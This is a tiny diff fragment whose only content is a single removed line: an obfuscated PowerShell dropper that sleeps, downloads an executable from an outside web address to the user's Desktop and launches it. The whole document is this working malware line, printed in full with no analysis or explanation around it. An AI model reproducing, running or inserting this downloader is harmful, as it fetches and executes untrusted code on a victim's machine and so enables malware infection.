@@ -1,1 +1,0 @@
-$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gETfoLDERpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dOwNLoaDFiLE.iNVoKE('http://gangfly.co/sgw','$Des\1564880.exe');&'Start-Process' $Des\1564880.exe
